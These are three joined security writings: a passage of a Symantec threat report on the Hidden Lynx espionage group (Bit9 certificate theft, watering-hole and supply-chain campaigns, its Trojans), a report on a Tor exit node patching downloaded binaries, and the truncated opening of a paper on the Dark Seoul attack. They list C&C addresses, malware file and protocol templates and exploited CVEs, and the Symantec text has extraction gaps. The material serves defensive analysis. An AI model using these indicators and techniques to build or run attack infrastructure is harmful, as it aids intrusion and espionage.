The attackers installed Backdoor.Hikit, a Trojan that provides extremely stealthy remote access to compromised systems.This highly customized Trojan is typically installed onto servers in the victims’ DMZ,which was the case at Bit9.Credentials for another virtual machine were then stolen.These were used Bit9’s digital code-signing certificates.The attackers used this code-signing infrastructure to sign thirty-two malicious files.Symantec telemetry shows some of these files have been present within select organizations in the United States defense industrial sector.The signing of these files is significant, since they could then be used to circumvent the trust protection model offered by the Bit9 platform.The Trojans signed include variants of Backdoor.Hikit (the remote access Trojan used in the initial compromise) and another RAT called Trojan.Naid.Some malicious attack scripts were also signed.Each Trojan has a specific purpose.Backdoor.Hikit was used to target public-facing infrastructure while Trojan.Naid was used to perform highly targeted attacks through email and watering-holes.Bit9 was alerted to the compromise in January 2013 and took immediate containment steps such as revoking the digital signature and reaching out to their entire customer.According to Bit9, the attacks that followed

<figure></figure>   <caption>Figure 4.Trojans successfully acquired with command-and-control (C&C) servers from the Bit9 investigation</caption> 



<footer>Page 9</footer>

<header>
                                                                      Hidden Lynx – Professional Hackers for Hire
</header>

were not financially motivated, but rather were an attempt to access information.On Bit9’s own admission,
three customers were impacted.In conjunction with the Bit9 compromise, the Hidden Lynx group had another significant campaign well under
way.They had just concluded phase one of the VOHO campaign, a watering-hole operation orchestrated to
attack organizations in the Boston, Massachusetts area – it was a likely a distribution vector for the newly signed files.</section>
<section>
<heading>The VOHO campaign</heading>
The VOHO campaign, first publicized by RSA, is one of the largest and most successful watering-hole attacks to date.The campaign combined both regional and industry-specific attacks and predominantly targeted organizations that operate in the United States.In a rapidly spreading two-phase attack, which started on June 25 and finished July 18, nearly 4,000 machines had downloaded a malicious payload.These payloads were being delivered to unsuspecting victims from legitimate websites that were strategically compromised.This watering-hole infection technique was quite innovative at the time.In a watering-hole attack, the attacker compromises a legitimate website that the target uses and trusts.The attacker then lies in wait for the target to visit the compromised site in order to infect them.The scale and targeted nature of the VOHO campaign set it apart from watering-hole attacks observed in the past.The group first adopted this technique in December 2011 when an exploit or the Oracle Java SE Rhino Script Engine Remote Code Execution Vulnerability (CVE-2011-3544) was leveraged to distribute their payloads.As a result of their success, many other strategic compromises have been adopted by other attack groups, as seen in a notable attack targeting iOS developers earlier in 2013 which impacted employees at Facebook, Apple and Twitter.<figure></figure>   <caption>Figure 5.The VOHO campaign target regions and industries</caption>

In the VOHO campaign, ten legitimate websites were strategically compromised.The attackers carefully selected these websites based on the likelihood that the intended target(s) would visit them during the exploit delivery phase.The attackers likely pre-determined who visited the watering-hole in advance of the distribution phase of attack.This could easily be achieved by examining the access logs of compromised Web servers.The categories of websites compromised were both regional and industry-specific in nature and targeted the following key areas      
illustrated in Figure 5.<figure></figure>  <caption>Figure 6.The VOHO campaign malicious activity timeline - a two-phase attack</caption>
</section>

<footer>Page 10</footer>

<header>
                                                                      Hidden Lynx – Professional Hackers for Hire
</header>


<section>
<heading>Timeline of activity</heading>
The VOHO watering-hole distributed remote access Trojans in two phases.In phase one of the attack, an Internet
Explorer zero-day vulnerability, the Microsoft XML Core Services CVE-2012-1889 Remote Code Execution
Vulnerability (CVE-2012-1889), was leveraged.On July 10, Microsoft introduced the patch for CVE-2012-1889
and activity at the watering-hole ceased.This appears to have been a clever decision on behalf of the attackers.If they continued to deliver the exploit, they risked detection and would have hurt their chances of retaining
access to the watering-hole for phase two of the campaign.Within six days, phase two of the distribution began,
this time using a malicious Java applet exploiting the Oracle Java SE CVE-2012-1723 Remote Code Execution
Vulnerability (CVE-2012-1723).This Java exploit was patched at the time.Having already used two zero-day
exploits in quick succession (the first zero-day exploit was used in the GOTHAM campaign in May 2012, see
appendix for more details), the Hidden Lynx group may not have had another one at their disposal.The timeline of activity at the watering-hole is shown in Figure 6.In each phase of the attack, two Trojans were being distributed at different intervals.The customized version
of “Gh0st RAT”, Backdoor.Moudoor, saw large-scale distribution in comparison to Trojan.Naid, which was used
more selectively in these attacks.Before being used in the second phase of the attack, Trojan.Naid was signed with the Bit9 certificate.Moudoor
was never observed during the attack on Bit9, which could indicate that two separate teams are at work
here.With Moudoor and Naid using different command-and-control (C&C) servers, each team could work
independently on alternative objectives.The discovery of the Naid C&C would also be less likely in comparison
to Moudoor’s, as its large-scale distribution would inevitably create more noise as it continued to impact many
organizations.<figure></figure>
<caption>Figure 7.The VOHO campaign – Trojans distributed and C&C servers used to command and control</caption>

</section>


<footer>Page 11</footer>

<header>
                                                                      Hidden Lynx – Professional Hackers for Hire
</header>


<section>
<heading>Team Naid’s role</heading>
During this campaign, Team Naid had a very specific objective – to gain access to information from organizations
operating in the defense industrial sector.An unsigned version of Naid was distributed to select victims within
the defense industrial sector during phase one until Microsoft supplied a patch for CVE-2012-1889 on July 10.It
may have been during this phase of the attack when the team realized the information they sought was held by
organizations protected by Bit9.As the team found it difficult to compromise Bit9-protected computers and had
no viable exploit for distribution, their immediate objective focused on Bit9’s digital code-signing certificate.By July 13, just a few days after they started their attacks on Bit9, they obtained the Bit9-signed Naid.By the
next day, they had built a viable Java exploit to distribute their Trojan.Armed with the newly-signed Trojan and
delivery vehicle, the group resumed malicious activity at the watering-hole for three days from July 16.It was
during this period that three organizations protected with the Bit9 platform were successfully compromised.In this campaign, Naid was specifically reserved for special operations against high value targets.Team Naid’s
objective was narrow and focused and the team aimed to limit Naid’s exposure.The sophistication of the
overall attack is typical of attackers with a very high pedigree.The team is clearly highly skilled; they operate
methodically and can switch objectives at a moment’s notice.They rapidly adapted to external factors that were
hindering their specific objective and pursued a difficult prize - the Bit9 certificate - in order to achieve their
overall goal.</section>
<section>
<heading>Team Moudoor’s role</heading>
The distribution of Moudoor during this campaign was on a much larger scale.Organizations operating in the financial sector, all levels of government (local and federal), healthcare, education and law were impacted during this campaign.There is a wealth of sensitive information within these organizations which would be of interest to both nation states and entities that would benefit from information as a result of corporate espionage attacks.The top distinct infections per organization type are shown in Figure 8.<figure></figure>
<caption>Figure 8.Industries with the most Backdoor.Moudoor infections during the VOHO campaign.</caption>

A campaign distributing Moudoor on such a large scale would require a sizeable team to operate and maintain remote access to these compromised computers.The breach phase of the operation could easily be handled by a smaller team, which then passes control to a larger team of operators who can traverse networks and retrieve the information they are tasked with gaining access to.To efficiently




<footer> Page 12 </footer>

<header>
                                                                       Hidden Lynx – Professional Hackers for Hire
</header>



  attack this many organizations concurrently would require an equally large number of operators.These Trojans
  require manual operation so it’s conceivable that tens if not hundreds of operators would be used post-breach to
  process and handle the stolen data.The VOHO campaign is one of a number of campaigns attributed to this group over the last four years.It showed
  how quickly the group could change their strategy and the lengths they would go to get to their targets.The fact
  that the Bit9 code-signing certificate breach was only a small part of this campaign shows how adaptable and
  determined the group is.</section>
<section>
<heading>Advanced zero-day access</heading>
  The group is highly organized and can gain advanced access to zero-day vulnerabilities.In February, the Hidden
  Lynx group used this advanced knowledge to take advantage of the Oracle Java SE CVE-2013-1493 Remote
  Code Execution Vulnerability (CVE-2013-1493) to attack Japanese targets in the FINSHO campaign.<heading>FINSHO</heading>
  Within two days of Bit9’s blog post on February 25, the attackers began distributing Moudoor and Naid in a campaign that leveraged CVE-2013-1493.Interestingly, the C&C server configured in Naid (110.173.55.187) was also configured in a sample found in the Bit9 incident.Although the version used against Bit9 was not observed elsewhere in the wild, the group’s methodical approach would indicate that a similar campaign may have been intended or that Trojan.The timeline for exploit development and distribution is illustrated in Figure 9.<figure></figure>
<caption>Figure 9.Timeline of activity for CVE-2013-1493 distributing Moudoor and Naid in the FINSHO campaign</caption>

  According to Oracle’s blog, CVE-2013-1493 was reported to them on February 1, the same day that class files exploiting it were added to MightDev.jar shown in Figure 10.In past Java exploits used by this group, the code was already public knowledge and a patch was already available for the 
  software.In this case, they gained advanced knowledge from an unknown source - a source with early access to the exploit conditions, possibly on the same day as Oracle.Oracle released the fix for CVE-2013-1493 on March 4.<figure></figure>
<caption>Figure 10.MightDev.jar used to distribute Naid and subsequently Moudoor</caption>


<footer>Page 13</footer>

<header>
                                                                      Hidden Lynx – Professional Hackers for Hire
</header>



  Figure 11 illustrates the relationship between FINSHO and the Bit9 incident through the shared C&C server used in both Naid configurations.<figure></figure>
  <caption>Figure 11.CVE-2013-1493 used to distribute Trojan.Naid and Backdoor.Moudoor (February/March 2013) in the FINSHO campaign</caption>

  Alternate C&C servers and separate websites for distribution provide further evidence that there are distinctions between how these teams operate.</section>
<section>
<heading>Supply chain attacks</heading>
  The Hidden Lynx group continued to attack the defense industry post-VOHO.In another campaign named SCADEF, manufacturers and suppliers of military-grade computers were observed installing a Trojanized Intel driver application.<heading>SCADEF</heading>                                    

  The attackers bundled this Intel driver application with variants of Backdoor.Moudoor using a popular Chinese
  archiving application called Haozip.The attackers likely compromised a legitimate download of this driver
  application from a non-reputable source but the true source was never discovered in this investigation.The technique is another avenue into hardened networks of interest.They attack not only hardware suppliers, but contractors that may access these network during their course of work.The group seeks out the weakest link in the chain and simply lies in wait.In these specific attacks, they simply wait for a shipment of compromised computers to be installed into the targeted network.Unique detections observed for these Trojanized applications are presented in Figure 12.<figure></figure>
 <caption> Figure 12.Supply chain hacking detections in the IT supply/defense/healthcare industry</caption>   

  The VOHO, FINSHO and SCADEF campaigns each showed how efficient and adaptable the group is when focusing on
  their targets.They use a wide range of advanced attack methods and change their strategy when required to carry out each operation.These three campaigns are only some of the operations undertaken by the Hidden Lynx group, making them a credible threat to several industries.</section>



<footer>Page 14</footer>

<section>
<heading>CONCLUSION</heading>

 From the evidence
 seen, it’s clear
 that Hidden
 Lynx belongs to
 a professional
 organization.<header>
                                                                         Hidden Lynx – Professional Hackers for Hire
</header>



<heading>Conclusion</heading>
    Cyberespionage campaigns are becoming increasingly common, with countless threat actors attempting to gain
    footholds into some of the best-protected organizations.These attacks are becoming increasingly sophisticated.The capabilities and tactics used by these threat actors vary considerably.The Hidden Lynx group is capable
    of undertaking focused attacks against niche targets and running large-scale campaigns targeting multiple
    organizations on a global scale.They have seen action in numerous campaigns since 2009 and repeatedly attack
    their targets with cutting-edge techniques.They quickly adapt to security counter-measures and are highly
    motivated.They are one of the most well-resourced and capable attack groups in the targeted threat landscape.From the evidence seen, it’s clear that Hidden Lynx belongs to a professional organization.They operate in a highly
    efficient manner.They can attack on multiple fronts.They use the latest techniques, have access to a diverse set
    of exploits and have highly customized tools to compromise target networks.Their attacks, carried out with such
    precision on a regular basis over long periods of time, would require a well-resourced and sizeable organization.They possess expertise in many areas, with teams of highly skilled individuals who can adapt rapidly to the changing
    landscape.This team could easily consist of 50-100 individuals.This level of resources would be needed to build
    these Trojans, maintain infection and C&C infrastructure and pursue confidential information on multiple networks.They are highly skilled and experienced campaigners in pursuit of information of value to both commercial and
    governmental organizations.The incident in Bit9, which ultimately led to successful compromises of hard-to-crack targets during the VOHO
    campaign, only serves to highlight this fact.The evolving targeted attack landscape is becoming increasingly
    sophisticated.As organizations implement security counter-measures, the attackers are adapting at a rapid rate.With a growing number of threat actors participating in these campaigns, organizations have to understand that
    sophisticated attackers are working hard to bypass each layer of security.It’s no longer safe to assume that any one
    solution will protect a company’s assets.A variety of solutions need to be combined and, with a better understanding
    of the adversary, tailored to adequately protect the information of most interest to the attackers.The Hidden Lynx group’s mission is large and they’re targeting a diverse set of information.The frequency and
    diversity of these attacks would indicate that the attackers are tasked with sourcing information from many
    organizations.These tasks are likely distributed within the team.The group’s goal is to gain access to information
    within organizations in some of the wealthiest and most technologically advanced countries across the globe.It is
    unlikely that they can use this information for direct financial gain, and the diversity of the information and number
    of distinguishable campaigns would suggest that they are contracted by multiple clients.This leads us to believe that
    this is a professional organization that offers a “hackers for hire” service.The worrying knock-on effect of this group’s activities is that other threat actors are learning and adopting their
    techniques.The Hidden Lynx group is not basking in their past glories, they are continuing to refine and streamline
    their operations and techniques to stay one step ahead of their competition.Organizations that are being attacked
    on multiple fronts need to better protect the information that is most valuable to them.We expect these attackers
    to be involved in many more high profile campaigns in the coming years.They will continue to adapt and innovate.They will continue to provide information servicing interests at both a corporate and state level.Groups like Hidden
    Lynx are certainly winning some of the battles, but as organizations gain a better understanding of how these groups
    operate, they can take steps to help prevent their most valuable information from falling into attackers’ hands.</section>


<footer>Page 16</footer>

<section>
<heading>APPENDIX</heading>
 
<header>
                                                                           Hidden Lynx – Professional Hackers for Hire
</header>



<heading>Appendix</heading>

 <heading>Related attacks</heading>
   The three campaigns that have already been examined in detail are only a snapshot of the group’s activities.Since the time they adopted Moudoor in late 2011, persistent attacks against organizations across the globe have been occurring on a regular basis, even to this day.These attackers pioneered the watering-hole technique, however they can also fall back to more traditional methods of attack, such as spear-phishing emails, supply chain attacks and Trojanized software updates.Since 2011, the Hidden Lynx
   group has leveraged five browser-based exploits for payload distribution, three of which were zero-day exploits.<caption>Table 1.In the first half of 2012, there was a particularly high distribution of Moudoor.There was a peak in June/July as a result of the VOHO campaign which is evident in the graph shown in Figure 13.<figure></figure>
   <caption>Figure 13.Unique infections of Moudoor and Naid (November 2011 – June 2013)</caption>

   There is also a peak at the beginning of the year which is a result of another high distribution campaign called WSDHEALTHY.This campaign, along with some other notable attacks and techniques, will be discussed in the following sections.This was a
two-phase attack which saw Team Naid and Team Moudoor share C&C infrastructure (219.90.117.132) in a smaller
campaign that infected organizations in the following industries:
•	 Financial services
•	 Information communications technology
•	 Government
•	 Marketing
•	 Information technology
•	 Aerospace/defense
•	 Energy
Many of the industries targeted in this campaign are similar to those targeted in the VOHO campaign, so this could be considered as a pre-cursor to that campaign.Similar to VOHO, this was a two-phased attack that leveraged two Internet Explorer zero-days for distribution (CVE-2012-1875 and CVE-2012-1889).Similar to VOHO, as Microsoft patched CVE-2012-1875, the attackers halted distribution.This prevented any unnecessary suspicious activity from being identified that could impact future activity from the compromised website.A timeline for this activity is presented in Figure 14.<figure></figure>
<caption>Figure 14.Activity timeline on gothamcenter.org</caption>

Sharing C&C infrastructure could indicate that both teams were working closely together and may have divided up the effort during this campaign.During phase two of this campaign, VOHO began.The Hidden Lynx group is clearly resourced to operate and maintain distribution and C&C infrastructure across multiple campaigns.This level of organization requires discipline at multiple levels within the group.This is not a small group of elite hackers – this is a well-organized professional organization.<figure></figure>
<caption>Figure 15.Moudoor and Naid share distribution and command and control servers</caption>

One campaign that rivals VOHO in terms of size is WSDHEALTHY.This is the first campaign where we see the group using Naid and Moudoor together sharing infrastructure and the first links to the Bit9 incident   




<footer>Page 19</footer>
    
<header>
                                                                Hidden Lynx – Professional Hackers for Hire
</header>                                                                


start to emerge.</section>
<section>
<heading>WSDHEALTHY – Shared infrastructure with the Bit9 incident</heading>
The Hidden Lynx group began using watering-hole attacks as early as December 2011.Although no zero-day exploit was available, they used a patched Java exploit (CVE-2011-3544) effectively to distribute Moudoor from three compromised websites.This campaign provided the first indications that the group was using both Moudoor and Naid to attack targets and share C&C infrastructure.Along with this, early links to the attacks on Bit9 began to emerge.The timeline of this activity is shown in Figure 16.<figure></figure>
<caption>Figure 16.Timeline of malicious activity associated with CVE-2011-3544</caption>

In these campaigns, the Hidden Lynx group made heavy use of infrastructure in Hong Kong, with the exception of yahooeast.net.This is this domain that links to the Bit9 attack, as it resolved to 66.153.86.14 – a C&C server used by the Backdoor.Hikit sample installed after the successful SQL injection attack on Bit9.Moudoor was being actively distributed from these websites for two, four and five months respectively.These are exceptionally long periods of time to retain access to compromised servers for payload distribution of this nature.The C&C servers used and the links between the Trojans and Bit9 are shown in Figure 17.<figure></figure>
<caption>Figure 17.CVE-2011-3544 - the first links between Moudoor and Naid emerge</caption>

Team Moudoor heavily relies on a dynamic DNS service called DTDNS to rapidly switch between C&C servers.In fact, they use direct IP connections or DTDNS exclusively to establish C&C communications, with the           




<footer>Page 20</footer>
  
<header>
                                                                  Hidden Lynx – Professional Hackers for Hire
</header>

exception of yahooeast.net which is a registered domain.The Hidden Lynx group uses techniques which have clearly been established through experience to maintain this infrastructure for long periods of time.They adapt quickly and likely have a stockpile of C&C servers that they can quickly switch to which provides maximum uptime during any given operation.Along with this, the Hidden Lynx group uses several different methods to infect their targets.In the SCADEF campaign, we saw how the group bundled Moudoor with legitimate software to infect targets.They also managed to
Trojanize software updates as well, as seen in the EASYUPDATE campaign where a Chinese P2P application was observed selectively installing Moudoor since 2011.<figure></figure>
<caption>Figure 18.Percentage breakdown of unique detections from VeryCD P2P client</caption>

</section>
<section>
<heading>EASYUPDATE – A Trojanized software update</heading>
Since November 2011, the Hidden Lynx group has been able to insert Moudoor into the distribution chain of one of the most popular Chinese P2P applications provided by VeryCD.com.There is a very low distribution of Trojanized updates and it is quite likely that they are somehow selectively installing Moudoor on specific clients.This is, without a doubt, the longest running distribution vector for the group, which infected victims predominantly in China, the United States and Hong Kong.<figure></figure>
<caption>Figure 19.Moudoor variants downloaded through P2P client updates</caption>

These are the earliest indications of Moudoor infections, with “kissnada” being one of the first DTDNS domains observed in use.This distribution vector’s exact purpose is still unclear, however it’s certainly linked to the group,   




<footer>Page 21</footer>
 
<header>
                                                                       Hidden Lynx – Professional Hackers for Hire
</header>


  as we have observed Moudoor samples in WSDHEALTHY configured to use kissnada58.chatnook.com and usa-mail.scieron.com for C&C communications.The Hidden Lynx group has left a clear fingerprint for the past two years with clearly identifiable links to the group’s activities.The use of customized Trojans, shared distribution and C&C infrastructure, coupled with repeated attacks on a predictable set of target organizations has allowed a more complete picture of these attacks to be compiled.A summary of the links between all of these attacks is presented in Figure 20.<figure></figure>
  <caption>Figure 20.Linking the group’s activity (November 2011-March 2013)</caption>

  </section>
<section>
<heading>Trojans used by the Hidden Lynx group</heading>
  The following section lists the Trojans that were used by the Hidden Lynx group throughout their various campaigns.<heading>Backdoor.Moudoor</heading>
  In 2011, the Hidden Lynx group began to use Backdoor.Moudoor.This is a customized version of “Gh0st RAT”.Gh0st RAT variants have been used in cyberespionage campaigns emanating from China for years.In 2009, Information Warfare Monitor published a detailed report, “Tracking GhostNet”, following an investigation into a cyberespionage network of more than 1,000 compromised computers affecting more than 100 countries.Many threat actors use customized versions of this RAT for cyberespionage operations.<heading>Trojan.Naid</heading>
  The team uses Trojan.Naid for special operations.It first appeared in May 2009 and has been used in many high profile attacks over the past four years.It shares




<footer>Page 22</footer>
 
<header>
                                                                     Hidden Lynx – Professional Hackers for Hire
</header>



technical similarities with other Trojans which also originate from China.All of these Trojans are potentially from the same group or they may source these Trojans from the same developer.The technical similarities are based on a shared file creation template and C&C protocol.<figure></figure>
<caption>Figure 21.Naid/Vasport obfuscation tool</caption>

The other Trojans that share these traits are:
•	 Backdoor.Vasport
•	 Backdoor.Boda
File creation template
        %TEMP%\uid.ax
        %%TEMP%%\%s.ax
        %%TEMP%%\%s _ p.ax
Command and control template
        POST http://%ls:%d/%x HTTP/1.1
        Content-Length: 2
        CONNECT %ls:%d HTTP/1.1
        Connection: keep-alive
        lynx
There is also evidence that Backdoor.Vasport and Trojan.Naid have shared the same packer to obfuscate the payloads from AV detection.The obfuscation tool used is also Chinese in origin and has a simple user interface to help pack these Trojans.Naid also has a history of using stolen digital certificates to overcome trust-based protection when attacking certain hardened targets.Some of the certificates identified are shown in Figure 22.<figure></figure>
<caption>Figure 22.Stolen digital certificates used by Trojan.Naid</caption>

<heading>Backdoor.Vasport</heading>
Backdoor.Vasport was delivered by exploiting the Adobe Flash Player CVE-2012-0779 Object Type Confusion Remote Code Execution Vulnerability (CVE-2012-0779).This was delivered in malicious Word documents in targeted attack emails.The exploit component used in these attacks was also used in the Elderwood Platform.Table 2 shows the payload from the malicious word documents.<caption>Table 2.These files were
signed with a digital signature from MGAME Corporation, a tactic used previously by the attackers.Interestingly, Backdoor.Boda and Backdoor.Vasport were both distributed using Flash zero-day exploits in embedded documents.It’s plausible that the group has a team dedicated to distribution using Flash exploits that customizes Trojans from the same code base that the Naid uses.<heading>Trojan.Hydraq(Operation Aurora)</heading>

The Hidden Lynx group has used cutting-edge attack techniques and a consistent methodology.Trojan.Naid has been in use since 2009 and Hidden Lynx attacks bear the hallmarks of a campaign that involved yet another Internet Explorer zero-day exploit in December 2009.Trojan.Naid was used in the infamous attacks on organizations in the financial, technology, Internet and media sectors called “Operation Aurora”.These attacks are linked with another Trojan called Trojan.Hydraq, but Naid was downloaded in stage three of the operation.<figure></figure>
<caption>Figure 23.Trojan.Naid links to Hydraq and Operation Aurora</caption>

Trojan.Hydraq disappeared from the targeted attack landscape shortly after Operation Aurora, most likely due to the close attention that it was receiving from security researchers.Trojan.Naid did not meet the same fate, as it is still being used in sophisticated targeted attacks to this day.Our innovative products and services protect people and
                                                        information in any environment—from the smallest mobile
                                                    device to the enterprise data center to cloud-based systems.Our industry-leading expertise in protecting data,
                                                    identities, and interactions gives our customers confidence
                                                        in a connected world.More information is available at
                                                            www.symantec.com or by connecting with Symantec at
                                                                                   go.symantec.com/socialmedia.Follow us on Twitter                                             Headquartered in Mountain View, Calif.,
       @threatintel                                                    Symantec has operations in 40 countries.More information is available at www.symantec.com.Visit our Blog
       http://www.symantec.com/connect/symantec-blogs/sr




                                    For specific country offices and contact numbers, please visit our website.Symantec World Headquarters                                                                                  Copyright © 2013 Symantec Corporation.All
350 Ellis St.  
Mountain View, CA 94043 USA 
+1 (650) 527-8000 
 1(800) 721-3934                                                                                                                                                                     Copyright 2013 Symantec Corporation.All
                                                                   rights reserved.Symantec, the Symantec Logo,
                                                                      and the Checkmark Logo are trademarks or
                                                                registered trademarks of Symantec Corporation
                                                            or its affiliates in the U.S. and other countries.Other names may be trademarks of their    respective owners.Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation.NO WARRANTY .The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use.Any use
of the technical documentation or the information contained herein is at the risk of the user.Documentation may include technical or other inaccuracies or
typographical errors.Symantec reserves the right to make changes without prior notice.</section>

</doc><doc>
<header>Background</header>
<section>
<heading>Summary</heading>

After creating and using a new exitmap module, I found downloaded binaries being patched through a Tor
exit node in Russia.Tor is a wonderful tool for protecting the identity of journalists, their sources, and
even regular users around the world; however, anonymity does not guarantee security.At DerbyCon this year I gave a presentation of my binary patching framework, BDF.Many binaries are
hosted without any transport layer security encryption.Some binaries are signed to prevent modification,
but most are not.During that presentation, I talked about the MITM patching of binaries during
download, and showed how easy it was using BDFProxy.I also mentioned that similar techniques are
probably already in use on the Internet.I had only circumstantial evidence until recently.</section>
<section>
<heading>Circumstantial Evidence</heading>

<heading>Microsoft Updates Error</heading>

I tested BDFProxy against a number of binaries and update processes, including Microsoft Windows
Automatic updates.The good news is that if an entity is actively patching Windows PE files for Windows
Update, the update verification process detects it, and you will receive error code 0×80200053.<figure></figure>
This error code indicates a failed signature verification for the downloaded binary.Windows Update
produces this error code for three root causes:

   1.The file was truncated during download.Very possible.2.The file was patched during download.Improbable.3.MS certificate verification is broken.Very improbable.If you Google the error code, the official Microsoft response is troublesome.<figure></figure>
The first link will bring you to the official Microsoft Answers website.Notice that this question has been
viewed over 34,000 times.<figure></figure>
If you follow the three steps from the official MS answer, two of those steps result in downloading and
executing a MS ‘Fixit’ solution executable.<figure></figure>


If an adversary is currently patching binaries as you download them, these ‘Fixit’ executables will also be
patched.Since the user, not the automatic update process, is initiating these downloads, these files are not
automatically verified before execution as with Windows Update.In addition, these files need
administrative privileges to execute, and they will execute the payload that was patched into the binary
during download with those elevated privileges.Note: a Windows Home or Enterprise user could configure AppLocker to only run signed binaries.</section>
<section>
<heading>Nullsoft Scriptable Install System (NSIS) Error</heading>

NSIS provides a form of self-checking that weakly ensures that a binary was not modified after compiling.It issues the following error when the self-checking fails:


<figure></figure>

Looking at Google Trends, this error message is quite common:




Notice the top countries where this search is originating:



<figure></figure>

A user can receive an error code for any of the following three root causes:

   1.The binary was patched.Improbable.2.The binary was truncated due to a poor Internet connection.Very probable.3.An actual error with the install program.Very improbable.This combined circumstantial evidence left me wondering if there is an individual or group actively
patching binaries on the greater Internet.</section>
<section>
<heading>Caught Red-Handed</heading>

To have the best chance of catching modified binaries in transit over the Internet, I needed as many exit
points in as many countries as possible.Using Tor would give me this access, and thus the greatest chance
of finding someone conducting this malicious MITM patching activity.After researching the available tools, I settled on exitmap.Exitmap is Python-based and allows one to
write modules to check exit nodes for various modifications of traffic.Exitmap is the result of a research
project called Spoiled Onions that was completed by both the PriSec group at Karlstad University and SBA
Research in Austria.I wrote a module for exitmap, named patchingCheck.py, and have submitted a pull request to the official
GitHub repository.See the usage example.Soon after building my module, I let exitmap run.It did not take long, about an hour, to catch my first
malicious exit node.<figure></figure>


Details from https://check.torproject.org/exit-addresses

ExitNode 8361A794DFA231D863E109FC9EEEF21F4CF09DDD
Published 2014-10-22 01:06:40
LastStatus 2014-10-22 02:02:33
ExitAddress 78.24.222.229 2014-10-22 02:08:01

This exit node was very active.Upon further inspection, the original binary is wrapped within another binary similar to the technique
mentioned in the research from Flex Grobert, et al, titled “Software Distribution Malware Infection
Vector” (2008).However, these malware authors solved the icon issue noted in the paper by keeping the
.rsrc section intact.By using a wrapper for the original binary, the malware authors do not invoke the
NSIS error and bypass simple self-checking mechanisms.Out of over 1110 exit nodes on the Tor network, this is the only node that I found patching binaries,
although this node attempts to patch just about all the binaries that I tested.The node only patched
uncompressed PE files.This does not mean that other nodes on the Tor network are not patching binaries;
I may not have caught them, or they may be waiting to patch only a small set of binaries.Leviathan has notified the Tor Project of the issue.</section>
<section>
<heading>Going Forward</heading>

Companies and developers need to make the conscious decision to host binaries via SSL/TLS, whether or
not the binaries are signed.All people, but especially those in countries hostile to “Internet freedom,” as
well as those using Tor anywhere, should be wary of downloading binaries hosted in the clear—and all
users should have a way of checking hashes and signatures out of band prior to executing the binary.</section>
</doc><doc>
<cover>
<header>CISAK 2013 – C1/O/8</header>
<heading>Dark Seoul Cyber Attack: Could it be worse?</heading>
Jonathan A.P.Marpaung <fn>1</fn>, HoonJae Lee1
<fn>1</fn>
<footnote>
Cryptography & Network Security Lab, Dongseo University
San 69-1, Jurye 2-dong, Sasang-gu, Busan 617-716, Korea
1
jonathan@spentera.com
1
hjlee@dongseo.ac.kr
</footnote>
</cover>

<section>
<heading>Abstract.</heading> 

On March 20, 2013 a cyber attack now known as Dark Seoul, paralyzed several major banking services and broadcasters in South Korea.Labeled by the media as cyber terror, the attack significantly disrupted these services for at least one day.Despite these facts, various indicators suggest that the attack had a low level of sophistication.Major cyber attacks in the past such as Ten Days of Rain and the SK Communications breach employed far more advanced techniques compared to Dark Seoul.We examine the technical details of Dark Seoul by outlining the primary attack vector used, describing the malware components, and discussing the malware’s evasion techniques.Furthermore we compare this incident to previous attacks in order to determine its technical sophistication using these attacks as a relative benchmark.Lastly we explore various malware design techniques that were not used in the malware such as multiple propagation vectors, 0-day exploits, and evasion techniques, thus presenting a proof of concept of the malware’s low technical sophistication.Keywords: advanced persistent threat; cyber attack; Dark Seoul; defense; malware analysis;
</section>

<section>
<heading>A.INTRODUCTION</heading> 
 
 On March 20, 2013, at approximately 14.15PM South Korea suffered a cyber attack that resulted in the denial of service of several major banks and broadcasters.Reported as a major cyber attack, our analysis of the malware and attack vectors employed suggests that the malware had a relatively low level of technical sophistication.Firstly we explore the technical components of Dark Seoul to analyze the sophistication of the malware and attack vectors used.This analysis is based on information obtained from the media as well as technical reports of various malware research labs such as AhnLab, Imperva, Symantec, Avast, Kaspersky, Alienvault, and Sophos.Secondly we conduct a comparative study of Dark Seoul by looking at prior cyber attacks, namely Stuxnet, 10 Days of Rain, and the SK Communications breach.By doing so we draw a picture of South Korea’s current security posture since those attacks.Lastly we discuss several design characteristics of advanced malware used by determined adversaries to carry out more technically advanced and stealthier attacks, therefore highlighting the components where Dark Seoul lacked sophistication.</section>

<section>
<heading>B.POSTMORTEM</heading>
 Television broadcasters YTN, MBC, and banks KBS, Shinhan, Nonghyup, and Jeju were targeted in this recent attack.The Korea Internet Security Agency (KISA) reported that about 48,000 computers were affected making service inaccessible and the victim organizations needed weeks to fully restore all functions <fn>[1]</fn>.In terms of impact, the attackers managed to successfully penetrate the target networks, pivot their way into critical assets, wipe out systems, cause denial of services, and trigger enough public response to spur the media into using terminology such as cyber terror and advanced persistent threats.In this paper we take an in-depth look of the malware by examining the attack vectors used, and later discuss whether the claims in the media are warranted.According to the investigating team consisting of government, military, and civilian members, as many as 76 samples of malware were collected from infected machines <fn>[2]</fn>.We present the most likely primary attack vector used by the attackers by discussing information summarized from reports by Avast <fn>[3]</fn>, Trend Micro <fn>[4]</fn>, and Symantec <fn>[5]</fn><fn>[6]</fn> issued in the first few days following the attack.<figure></figure>
 <caption>Fig.1.Dark Seoul Attack Vector</caption>

<heading>1.Spearphishing</heading>
 Trend Micro researchers discovered a phishing email sent to South Korean organizations on March 19.The email contained a malicious Trojan downloader which the researchers report to have been detected by their Deep Discovery software.This is likely to be the initial attack point.<heading>2.Launch Platform – Cross-Site Scripting</heading> 
 Avast detected the attacks originating from the Korea Software Property Right-Council (SPC) website (http://www.spc.or.kr) possibly infected via the phishing email sent on the 19th.Usage of a legitimate website/server in the target nation/region for launching attacks is a common tactic used to minimize detection.The SPC website contained JavaScript causing the client browser to load an iframe loading the contents of http://rootadmin2012.com, which was the main attack site for hosting the malicious payloads.<heading>3.Exploitation</heading> 
 Examination of rootadmin2012.com revealed heapspray and shellcodes with references to Internet Explorer (IE).Avast managed to identify the vulnerability exploited as CVE-2012-1889 <fn>[7]</fn> which allows remote attackers to execute arbitrary code or cause a denial of service via a crafted website.The vulnerability targets Microsoft XML Core Services 3.0 – 6.0 with a published metasploit exploit targeting MS XML Core Services 3.0 via IE6 and IE7 over Windows XP <fn>[8]</fn>.After gaining access the second stage downloader file (sun.exe) performs the following actions: 
 
